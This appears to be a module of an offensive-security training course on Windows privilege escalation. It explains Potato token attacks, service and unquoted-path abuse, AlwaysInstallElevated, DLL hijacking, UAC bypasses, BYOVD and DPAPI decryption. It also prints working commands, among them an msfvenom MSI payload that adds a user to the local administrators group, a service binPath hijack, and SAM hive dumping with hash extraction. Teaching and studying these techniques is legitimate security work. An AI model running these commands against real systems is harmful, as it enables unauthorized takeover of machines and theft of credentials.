# Module 21 · Windows Privilege Escalation

> *"A standard user with `SeImpersonatePrivilege` is not a standard user. They are SYSTEM in waiting."*

You have a Windows shell — maybe through a phished credential, maybe through web RCE on an IIS box, maybe through a stolen Kerberos ticket. You're running as `lab\alice`. You need to be `NT AUTHORITY\SYSTEM` (the local Administrator-equivalent) so you can dump LSASS, harvest credentials, or pivot to the domain.

Windows privesc is **systematic**. There are about 15 distinct technique families, and a 5-minute enumeration scan tells you which ones apply. This module walks all of them.

## The Windows privesc taxonomy

| Family | Mechanism | Typical evidence |
|---|---|---|
| **Service abuse** | Modify, replace, or hijack a service that runs as SYSTEM | Writeable service binary, weak service ACL |
| **Unquoted service path** | `C:\Program Files\Foo\bar.exe` without quotes → drop `C:\Program.exe` | `wmic service get name,pathname,startmode` |
| **AlwaysInstallElevated** | Reg key lets any user install MSI as SYSTEM | `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated=1` |
| **Token impersonation** | `SeImpersonatePrivilege` + a service account token = SYSTEM | "JuicyPotato" / "PrintSpoofer" / "RoguePotato" / "GodPotato" |
| **DLL hijack** | Service loads a DLL from a writeable path | DLL search order; missing DLLs |
| **Registry abuse** | `HKLM` keys writable that affect SYSTEM operations | `IFEO`, autoruns, RPC keys |
| **Scheduled task** | Task runs as SYSTEM, action path is writeable | `schtasks /query /v` |
| **Stored credentials** | DPAPI, Credential Manager, SAM, registry hives | `cmdkey /list`, browser saved passwords |
| **UAC bypass** | Auto-elevating COM objects, signed binary side-load | Specific exe + dll combos (fodhelper, sdclt, etc.) |
| **Kernel exploit** | Local KASLR/SMEP/SMAP bypass + UAF | Patch tuesday gaps |
| **Driver exploit** | Vulnerable signed driver loaded → kernel R/W | "BYOVD" attacks |
| **Group membership** | `Backup Operators`, `Hyper-V Administrators`, `Print Operators` | `whoami /groups` |
| **Filesystem ACL** | Writeable file in privileged location | `icacls` checking PE files in `C:\Windows\System32` |
| **Shadow copy** | Volume Shadow Service has SAM/SECURITY/SYSTEM accessible | `vssadmin list shadows` |
| **PrintNightmare / family** | Print spooler RCE / privesc CVEs | CVE-2021-1675, CVE-2021-34527, CVE-2024-38199 |

## The 5-minute Windows enumeration

```powershell
# Run windows_enum (single Python file works on Windows 10/11 with Python installed,
# or compile to exe via PyInstaller for plain Windows shells)
python -m redshift_toolkit.postex.windows_enum --output C:\Users\Public\enum.json

# Audit services
python -m redshift_toolkit.postex.service_audit

# Inspect token privileges
python -m redshift_toolkit.postex.token_inspector
```

Output of `windows_enum`:

| Section | Contents |
|---|---|
| `os` | Version (`Win11 23H2`), build, product type, install date |
| `current_user` | SID, username, profile path, integrity level (Low/Medium/High/SYSTEM) |
| `groups` | Token group memberships → `whoami /groups` parsed |
| `privileges` | Token privileges → `whoami /priv` parsed; `SeImpersonate`, `SeBackup`, etc. |
| `services` | All services with `state`, `start_type`, `binary_path`, `account`, `acl` |
| `unquoted_paths` | Services with unquoted binary paths in writeable directories |
| `weak_service_acl` | Services where current user has `SERVICE_CHANGE_CONFIG` |
| `weak_binary_acl` | Service binaries writeable by current user |
| `auto_runs` | `HKLM/HKCU\Run`, `HKLM/HKCU\RunOnce`, scheduled tasks at logon |
| `installed_software` | Programs (incl. version) — match against vuln DB |
| `network` | Listening ports, ARP, routes |
| `firewall` | Inbound/outbound rules |
| `windows_features` | RSAT, WSL, Hyper-V, IIS — admin tools enabled |
| `wifi_creds` | `netsh wlan show profiles ... key=clear` |
| `credential_manager` | `cmdkey /list` parsed |
| `unattend_files` | `C:\Windows\Panther\Unattend.xml` etc. — historical install creds |
| `gpp_passwords` | Group Policy Preferences cpassword leftovers (legacy) |
| `dpapi_files` | Locations of DPAPI master keys for the user |
| `installed_drivers` | All loaded kernel drivers (BYOVD candidates) |
| `applocker_policy` | If AppLocker is enforced, what the rules are |
| `wsl_distros` | WSL distributions installed |

## Token privileges — the real game

`whoami /priv` is the most important command on Windows. Every privesc target either has a juicy privilege already or there's a pivot to one.

| Privilege | What it grants you |
|---|---|
| `SeDebugPrivilege` | Open any process for `PROCESS_ALL_ACCESS` → inject into LSASS, dump credentials |
| `SeImpersonatePrivilege` | Impersonate a token from a thread/named pipe → SYSTEM via Potato attacks |
| `SeAssignPrimaryTokenPrivilege` | `CreateProcessAsUser` with another user's token → SYSTEM via SeImpersonate-class |
| `SeBackupPrivilege` | Read any file (incl. `SAM`, `SYSTEM`, `SECURITY` hives) |
| `SeRestorePrivilege` | Write any file |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeLoadDriverPrivilege` | Load kernel driver → kernel R/W via vulnerable driver |
| `SeCreateTokenPrivilege` | Create your own token (very rare) |
| `SeTcbPrivilege` | "Trusted Computing Base" — full SYSTEM equivalence |
| `SeManageVolumePrivilege` | Volume management — leads to file write anywhere |

`token_inspector.py` enumerates current token privileges and matches them against a privesc playbook:

```
$ python -m redshift_toolkit.postex.token_inspector
[+] Current user: lab\svc_iis (S-1-5-21-...-1108)
[+] Integrity Level: High Mandatory
[+] Privileges (enabled):
    SeImpersonatePrivilege         → POTATO ATTACKS (PrintSpoofer, RoguePotato, GodPotato)
    SeChangeNotifyPrivilege        → benign (default)
    SeIncreaseWorkingSetPrivilege  → benign

[+] Recommended technique:
    GodPotato — works on Win10/11 + Server 2016/2019/2022
    https://github.com/BeichenDream/GodPotato
```

### The Potato family: SeImpersonate → SYSTEM

Any user with `SeImpersonatePrivilege` (which IIS, MSSQL, MS Exchange, IIS_IUSRS service identities **all have by default**) can become SYSTEM.

**Mechanism:**
1. Trick a SYSTEM-running service into authenticating to a controlled named pipe / RPC endpoint.
2. The service authenticates with its own token.
3. Use `ImpersonateNamedPipeClient()` to grab that token.
4. Spawn cmd.exe with the token → SYSTEM.

| Variant | Trigger | Status |
|---|---|---|
| **HotPotato (2016)** | NBNS spoof + WPAD + NTLM relay | Patched MS16-075 |
| **RottenPotato (2017)** | DCOM auth via local 127.0.0.1 | Patched in newer builds |
| **JuicyPotato (2018)** | DCOM CLSID enumeration | Patched 2019+ |
| **RoguePotato (2020)** | DCOM with attacker-controlled OXID resolver | Works on Win10 < 1809 |
| **PrintSpoofer (2020)** | RpcRemoteFindFirstPrinterChangeNotificationEx | Works wherever spooler runs |
| **GodPotato (2023)** | RPC over named pipe; works without spooler | Works on Win10/11 + Server 2016-2022 |

In the field, **GodPotato is the answer in 2026** unless the host has explicit RPC hardening.

## Service abuse

Three sub-flavors of service abuse:

### Modify the service binary

`C:\services\foo.exe` is the binary for service `foosvc`. Service runs as SYSTEM. Current user has `Modify` on `C:\services\`. Replace `foo.exe` with shellcode → restart service → SYSTEM.

Detect with `service_audit`:

```
$ python -m redshift_toolkit.postex.service_audit
[CRITICAL] Service: foosvc
   Binary: C:\services\foo.exe
   Account: LocalSystem
   Binary writeable by: lab\alice
   ATTACK: replace binary, restart service via `sc stop foosvc && sc start foosvc`
```

### Modify the service config

Even without write to the binary, if you have `SERVICE_CHANGE_CONFIG`, you can re-point the service to your own binary:

```cmd
sc config foosvc binPath= "C:\Users\alice\Desktop\me.exe"
sc stop foosvc
sc start foosvc
```

`service_audit` reads each service's DACL and flags this.

### Unquoted service path

`PathName="C:\Program Files\Foo Bar\service.exe"` — quoted, fine.
`PathName=C:\Program Files\Foo Bar\service.exe` — *unquoted*, danger.

Windows tries to resolve in this order:
- `C:\Program.exe`
- `C:\Program Files\Foo.exe`
- `C:\Program Files\Foo Bar\service.exe`

If you have write to `C:\` (rare) or `C:\Program Files\` (also rare), you can drop a binary that gets executed before the legitimate one.

```
$ python -m redshift_toolkit.postex.service_audit --unquoted
[HIGH] Service: foo
   Binary: C:\Program Files\Foo Bar\service.exe (UNQUOTED)
   Writeable parent: C:\ (no, BUILTIN\Users denied)
[CRITICAL] Service: bar
   Binary: C:\Apps\Sub Dir\bar.exe (UNQUOTED)
   Writeable parent: C:\Apps (yes, lab\alice has Modify)
   ATTACK: drop C:\Apps\Sub.exe, trigger service start
```

## AlwaysInstallElevated

A Group Policy misconfiguration that lets any user install MSI packages as SYSTEM:

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be `0x1`. If so:

```cmd
msiexec /quiet /qn /i C:\Users\alice\evil.msi
```

`msfvenom` builds the MSI:

```bash
msfvenom -p windows/x64/exec CMD='cmd.exe /c net localgroup administrators alice /add' -f msi -o evil.msi
```

`windows_enum` reports the registry state directly.

## DLL hijacking

Three preconditions:

1. A SYSTEM-running process loads a DLL by name (not absolute path).
2. The DLL is searched along Windows' DLL search order (current dir, PATH, etc.).
3. You can write a DLL in one of those directories before the target.

The classic case is a service that calls `LoadLibrary("foo.dll")` and `foo.dll` doesn't exist anywhere. Tools like Process Monitor (Sysinternals) trace this in real time.

`windows_enum` runs Process Monitor-equivalent tracing for a few seconds and reports `NAME NOT FOUND` results — DLLs being looked for and not found.

## DPAPI

DPAPI (Data Protection API) is the Windows mechanism for encrypting per-user secrets. **Browser saved passwords, Wi-Fi credentials, Outlook saved credentials, RDP saved sessions, Credential Manager entries** — all DPAPI.

To decrypt DPAPI blobs you need:
- The user's DPAPI master key (stored in `%APPDATA%\Microsoft\Protect\<SID>\<keyguid>`)
- And either:
  - The user's password (decrypts master key directly)
  - The user's NTLM hash (decrypts master key for domain users)
  - Or local SYSTEM (uses LSA secrets)

`creds/dpapi_decryptor.py` decrypts DPAPI blobs given password or hash:

```bash
python -m redshift_toolkit.creds.dpapi_decryptor \
    --master-key 'C:\Users\alice\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\abcd-1234' \
    --password 'Password1' \
    --blob 'C:\Users\alice\AppData\Local\Microsoft\Credentials\xxx'
```

## SAM / SECURITY / SYSTEM hives

When you have admin / SYSTEM, the goal is to dump the local password hashes and LSA secrets. The hives live in `C:\Windows\System32\config\`:

- `SAM` — local user NTLM hashes
- `SYSTEM` — boot key (needed to decrypt SAM/SECURITY)
- `SECURITY` — LSA secrets, cached domain creds

These files are locked while Windows runs. Three ways to read them:

1. **Volume Shadow Copy** — `vssadmin create shadow /for=C:` then read `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM`.
2. **Registry SaveKey** — with admin, `reg save HKLM\SAM C:\Users\Public\sam.save`.
3. **WMIC shadowcopy create** — same effect.

`creds/secretsdump_lite.py` parses saved hives and outputs hashcat-format hashes:

```bash
python -m redshift_toolkit.creds.secretsdump_lite \
    --sam sam.save --system system.save --security security.save
```

This is a deliberately simplified reimplementation of impacket's `secretsdump.py`. For production use, prefer impacket — it handles edge cases (different RC4 versions, AES-128 vs AES-256 LSA secrets, etc.) better.

## NTLM relay

NTLM relay is a network-level attack but **the privesc consequence** is critical: it lets an attacker who has SMB-listening position turn an inbound NTLM auth into outbound auth to a different host or service. With a coercion bug like PetitPotam (`MS-EFSRPC`) or PrinterBug (`MS-RPRN`) you can force a target to authenticate to you, then relay that auth to LDAPS to grant yourself DCSync rights.

Classic relay chains:

| From | To | Outcome |
|---|---|---|
| Any user authentication | LDAPS on DC | Grant DCSync rights |
| DC machine account auth | LDAPS on DC | DCSync via DC (ADCS-ESC8) |
| User auth | SMB on file server | File access as user |
| User auth | HTTP / EWS | Inbox access |
| User auth | AD CS HTTP enrollment | Get cert as user → PKINIT → TGT |

Our `creds/ntlm_relay_coord.py` is a **coordinator/signaling tool** — it integrates with `impacket-ntlmrelayx` (the canonical implementation). It is not a re-implementation. It exists to:
- Track which targets we've successfully coerced
- Schedule coercion + relay across many targets
- Decide which relay target gives us the best privesc path
- Hand off results into the asset graph (Part 3)

## UAC bypass

UAC (User Account Control) is the prompt that asks "Do you want this app to make changes?" An *Administrator* user runs at Medium integrity by default, escalates to High via UAC. Bypassing UAC means escalating Med→High without the prompt.

Two main families:

### Auto-elevating COM objects

Some COM objects auto-elevate when called by a Microsoft-signed binary. Drop a fake helper in a path the COM expects:

| Bypass | Mechanism |
|---|---|
| **Fodhelper** | `fodhelper.exe` reads `HKCU\Software\Classes\ms-settings\Shell\Open\command` (no DelegateExecute) |
| **EventVwr** | `eventvwr.msc` reads `HKCU\Software\Classes\mscfile\shell\open\command` |
| **SDCLT** | `sdclt.exe` reads `HKCU\Software\Classes\Folder\shell\open\command` |
| **CMSTP** | INF file with arbitrary command; auto-elevation if signed |
| **WSReset** | `WSReset.exe` reads `HKCU\Software\Classes\AppX*\Shell\open\command` |

### DLL side-load via signed binary

A signed Microsoft binary loads a DLL from a writeable user path → drop your DLL → loaded with binary's elevation.

Modern UAC bypasses are tracked in `hfiref0x/UACME` on GitHub. As of 2026, ~80 distinct techniques. Most bypasses break with each Windows feature update.

We **don't** bake every UAC bypass into the toolkit (they shift with each Windows release). Instead, `windows_enum` reports:

- Current user UAC integrity level
- Whether user is in the local Administrators group
- Windows build number and Last Cumulative Update date
- Which UACME bypasses are likely to work for this build (lookup table)

## Kernel & driver exploits

Local kernel exploits on Windows are rare in 2026 (KMCI, HVCI, DKOM mitigations, virtualization-based security). The viable vector is **BYOVD** — Bring Your Own Vulnerable Driver.

You install a legitimate signed driver that has a known kernel R/W primitive (e.g., `RTCore64.sys`, `dbutil_2_3.sys`, `gdrv.sys`). With kernel R/W you can:

- Disable EDR (zero out callbacks in driver tables)
- Read/write any process memory
- Steal SYSTEM token via DKOM
- Execute kernel shellcode

Signature-based detection of vulnerable drivers is now in Microsoft Defender's **driver block list** (`HVCIBlock`). Operators rotate to less-known vulnerable drivers.

We list known-vulnerable drivers in `windows_enum`'s `installed_drivers` section but do not bundle exploit code — BYOVD attacks against production targets are extremely sensitive and engagement-specific.

## Industry framings

| Vertical | Windows footprint to know |
|---|---|
| **Defense / Government** | Mostly Windows 10/11 LTSC, Server 2019/2022. STIG-compliant baseline removes many obvious privescs (no SeImpersonate on user accounts). Look for service accounts, scheduled tasks, GPO oddities. |
| **Healthcare** | Wildly mixed: Win 7 / Server 2008 R2 still running medical equipment. EHR (Epic, Cerner) workstations with broad service accounts. |
| **Financial** | Windows-on-banking-application footprint. Citrix XenApp common — privesc *within* a published app is the entry point. |
| **Manufacturing / OT** | Windows engineering workstations driving PLCs. Often unpatched (vendor refused to support patching). |
| **Education** | Mixed; lots of Lenovo/Dell OEM driver crapware (great for DLL hijack). |

## Lab exercises

1. **TryHackMe Windows PrivEsc** room — covers all major techniques.
2. **HTB Stealth track** — Win privesc-heavy boxes.
3. **GodPotato lab.** Stand up an IIS-on-Win Server 2022 box, get a low-priv shell, run GodPotato, become SYSTEM.
4. **AlwaysInstallElevated lab.** Set the GPO bit; build an MSI; verify SYSTEM via `whoami`.
5. **DPAPI lab.** Capture a Chrome saved password file, decrypt with DPAPI master key (you set the user's password).

## Wrap-up: From foothold to domain

We've covered the entire **internal network** kill chain:
- Module 18: own the directory.
- Module 19: move through the network.
- Module 20: own the Linux boxes.
- Module 21: own the Windows boxes.

Combined with Part 4 (web initial access) and Part 3 (recon to find the foothold), you now have the *complete* offensive toolkit a US government TS/SCI red-team interview demands. Practice them, chain them, and document them — that documentation is your portfolio.

Next: Part 6 takes us into **system-level exploitation** — buffer overflows, ROP, kernel internals, and the modern memory-corruption mitigations.
